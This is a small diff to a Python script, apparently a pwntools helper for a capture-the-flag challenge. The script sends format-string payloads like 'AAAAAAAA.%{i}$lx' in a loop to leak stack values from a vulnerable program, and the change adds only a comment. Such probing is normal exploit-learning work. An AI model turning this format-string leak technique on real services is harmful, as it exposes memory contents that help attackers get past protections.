@@ -71,7 +71,7 @@ for i in range(args.num):
         # Format the counter
         # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
         # or use $s to show strings #change this
-        p.sendlineafter('go?\n', 'AAAAAAAA.%{}$lx'.format(i).encode())
+        p.sendlineafter('go?\n', 'AAAAAAAA.%{}$lx'.format(i).encode()) # change this
         # Receive the response
         p.recvuntil('hmm... ')  # change this
         result = p.recvline()
